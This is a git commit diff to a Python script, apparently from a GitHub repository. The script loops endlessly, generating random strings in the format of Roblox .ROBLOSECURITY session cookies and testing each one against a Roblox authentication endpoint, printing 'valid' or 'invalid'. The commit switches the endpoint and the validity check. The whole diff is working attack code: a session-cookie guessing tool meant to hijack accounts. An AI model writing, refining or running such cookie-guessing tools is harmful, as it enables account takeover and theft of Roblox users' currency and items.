ff8d3bd2277db9af2be0babeeeea29981dd259f5
KMZT <81222923+KMZT@users.noreply.github.com>
2024-09-28 22:47:42 +0600

    Update main.py

--- main.py
+++ main.py
@@ -5,11 +5,8 @@ while True:
   valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
   rancookie = ''.join((random.choice(valid_letters) for i in range(1356)))
   finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie
-  headers = {
-        'Cookie': '.ROBLOSECURITY=' + finalcookie
-    }
-  response = requests.get('https://auth.roblox.com/v1/auth/metadata', headers=headers)
-  if response.status_code == 200:
-    print("Valid")
+  response = get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': finalcookie})
+  if "Unauthorized" in response.text:
+    print("invalid")
   else:
-    print("Invalid")
+    print("valid")
